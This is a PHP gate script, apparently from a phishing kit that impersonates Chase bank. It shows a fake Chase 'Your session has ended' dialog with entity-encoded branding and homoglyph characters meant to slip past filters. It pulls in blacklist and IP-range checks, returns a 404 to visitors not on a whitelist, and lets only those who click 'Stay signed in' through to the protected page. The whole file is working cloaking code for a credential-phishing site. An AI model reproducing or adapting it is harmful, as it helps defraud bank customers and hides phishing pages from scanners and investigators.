<?php
$langcode = 'en'; // Default language. See Translations below
$wl       = '.ht_whitelist'; // whitelist file. Use .ht prefix in apache

/**
 * Translations
 */
$langs = array(
    'English' => 'en'
);

/**
 * Vars needed automatically replaced:
 * lang_output
 * curpagename
 * query_string
 * actionname
 *
 */
 include "../data.php";
include "../assets/includes/blacklist_lookup.php";
include "../assets/includes/ip_range_check.php";
$get_msg['en'] = '
<header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"><a id="logoHomepageLink" href="#" rel="nofollow"> <div class="chase logo"></div> <span class="util accessible-text">&#x43;&#x68;&#x61;&#x73;&#x65;&#x20;&#x68;&#x6f;&#x6d;&#x65;&#x70;&#x61;&#x67;&#x65;</span></a> </div></header>
<div class="container logon" data-is-view="true"><div><div id="backgroundImage"> <div class="jpui background image fixed" id="geoImage"></div>
<div id="overlay">
<div class="jpui modal" id="sessionTimeoutDialog" data-is-view="true"><div class="dialog vertical-center util print-position-initial" role="dialog"> <section class="dialogContent"><div class="modalContent"><div class="row"><div class="col-xs-12 col-sm-7 col-sm-offset-3"><h1 class="dialogTitle" tabindex="-1">Your session has ended.</h1> <div class="dialogMessage">&#x57;&#x65;&#x20;&#x61;&#x72;&#x65;&#x20;&#x75;&#x6e;&#x61;&#x62;&#x6c;&#x65;&#x20;&#x74;&#x6f;&#x20;&#x73;&#x69;&#x67;&#x6e;&#x20;&#x79;&#x6f;&#x75;&#x20;&#x69;&#x6e;&#x20;&#x61;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x63;&#x61;&#x6c;&#x6c;&#x79;&#x2e;&#x20;&#x46;&#x6f;&#x72;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2c;&#x20;&#x53;&#x74;&#x61;&#x79;&#x20;&#x73;&#x69;&#x67;&#x6e;&#x65;&#x64;&#x20;&#x69;&#x6e;&#x20;&#x74;&#x6f;&#x20;&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;&#x20;&#x79;&#x3bf;&#x75;&#x72;&#x20;&#x69;&#x6e;&#x66;&#x3bf;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;&#x6c;&#x79;&#x2e;</div> </div></div> <div class="row"><div class="dialogButtonContainer"><div class="col-xs-6 col-sm-3 col-sm-offset-3"><form method="POST" action="{curpagename}">
      <input type="hidden" name="query_string" value="{query_string}">
      <input type="hidden" name="actionname" value="{actionname}" />
	  <input type="submit" id="proceedToLogoff" class="jpui button focus fluid primary confirmationButtonClasses" value="Stay signed in"/>
	     </form> </div> <div class="col-xs-6 col-sm-3"></div></div></div></div></section></div>  </div>
</div>';
	 

/** DO NOT MODIFY UNDER THIS LINE **/

/* Selected language */
if (isset($_POST['langcode'])) {
    $langcode = $_POST['langcode'];
}

/* Get translations buttons */
$lang_output = '';
foreach ($langs as $langname => $langcoded) {
    $lang_output .= '<form method="POST" style="float:left;"><input type="hidden" name="langcode" value="' . $langcoded . '" /><input type="submit" value="' . $langname . '"/></form>';
}
$lang_output .= '<div style="clear:both"></div>';

/**
 * FUNCTIONS
 */

/**
 * Get html header
 */
function _get_header()
{
    $page_header = '
<html>
<head>
<title>&#x53;&#x69;&#x67;&#x6e;&#x20;&#x69;&#x6e;&#x20;&#x50;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;</title>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="./assets/css/home.css">
<link rel="stylesheet" href="./assets/css/logon.css">
<link rel="stylesheet" href="./assets/css/blue-ui.css">
<meta name="robots" content="noindex,nofollow">
<link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="./assets/img/favicon.ico">
</head>
<body>
  ';
    return $page_header;
}

/**
 * Get html footer
 */
function _get_footer()
{
    $page_footer = '

</body>
</html>';
    return $page_footer;
}

/**
 * Try to get current IP from current request
 */
function getRealIP()
{
    $client_ip = (!empty($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : ((!empty($_ENV['REMOTE_ADDR'])) ? $_ENV['REMOTE_ADDR'] : "unknown");
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $entries = mb_split('[, ]', $_SERVER['HTTP_X_FORWARDED_FOR']);
        reset($entries);
            foreach (array_keys($entries)as $key){
            $entry = trim($entry);
            if (preg_match("/^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/", $entry, $ip_list)) { // http://www.faqs.org/rfcs/rfc1918.html
                $private_ip = array(
                    '/^0\./',
                    '/^127\.0\.0\.1/',
                    '/^192\.168\..*/',
                    '/^172\.((1[6-9])|(2[0-9])|(3[0-1]))\..*/',
                    '/^10\..*/'
                );
                $found_ip   = preg_replace($private_ip, $client_ip, $ip_list[1]);
                if ($client_ip != $found_ip) {
                    $client_ip = $found_ip;
                    break;
                }
            }
        }
    }
    return $client_ip;
}

/**
 * Get protected script name
 */
function curPageName()
{
    return substr($_SERVER["SCRIPT_NAME"], strrpos($_SERVER["SCRIPT_NAME"], "/") + 1);
}

/**
 * Get url path of protected script name
 */
function curPathURL()
{
    $pageURL = 'http';
    if (array_key_exists('HTTPS', $_SERVER) && $_SERVER["HTTPS"] == "on") {
        $pageURL .= "s";
    }
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"];
    }
    $parts = explode('/', $_SERVER['REQUEST_URI']);
    for ($i = 0; $i < count($parts) - 1; $i++) {
        $pageURL .= $parts[$i] . "/";
    }
    return $pageURL;
}

/**
 * Block access
 */
function blocked($get_msg, $langcode, $lang_output, $actionname)
{
    $data    = array(
        'lang_output' => $lang_output,
        'curPageName' => curPageName(),
        'actionname' => $actionname,
        'query_string' => $_SERVER['QUERY_STRING']
    );
    $content = replace_vars($get_msg[$langcode], $data);
    header("HTTP/1.0 404 Not Found");
    die(_get_header() . $content . _get_footer());
}

/**
 * Replace {vars} in translations
 */
function replace_vars($buffer, $data)
{
    /* replace declared var names */
    foreach ($data as $k => $v) {
        if (is_string($v) || is_numeric($v) || $v == NULL) {
            $buffer = preg_replace('/\{' . strtolower($k) . '\}/', $v, $buffer);
        }
    }
    return $buffer;
}

/** END FUNCTIONS ****/

/**
 * Vars
 */
$requester_IP = getRealIP(); // current requester IP
$wl_filename  = dirname(__FILE__) . '/' . $wl; // set full path whitelist file

/* Create/Open session */
session_start();

/* Check actionname */
if (isset($_SESSION['actionname']) AND isset($_POST['actionname'])) {
    
    if ($_SESSION['actionname'] == $_POST['actionname']) {
        
        /* Add IP to whitelist */
        $fh = fopen($wl_filename, 'a');
        fwrite($fh, $requester_IP . "\n");
        fclose($fh);
        
        /* Destroy current session */
        $_SESSION = array(); // destroys sesion parameters
        $_COOKIE  = array(); // destroys cookies parameters
        session_destroy();
        
        /* Redirects to protected script */
        if (!empty($_POST['query_string'])) {
            header('Location: ' . curPathURL() . curPageName() . '?' . $_POST['query_string']);
        } else {
            header('Location: ' . curPathURL() . curPageName());
        }
        die();
        
    } else {
        
        /* Get current actionname session */
        $actionname = $_SESSION['actionname'];
        
    }
    
} else {
    
    /* Create new actionname session */
    $actionname             = '.ht_' . uniqid();
    $_SESSION['actionname'] = $actionname;
    
}

/* Check whitelist */
if (is_file($wl_filename)) {
    $whitelist = file($wl_filename, FILE_IGNORE_NEW_LINES);
    
    /* is IP in whitelist? */
    if (!in_array($requester_IP, $whitelist)) {
        blocked($get_msg, $langcode, $lang_output, $actionname);
    }
    
} else {
    
    /* Empty whitelist */
    blocked($get_msg, $langcode, $lang_output, $actionname);
    
}
// Lets continue loading protected script
?>
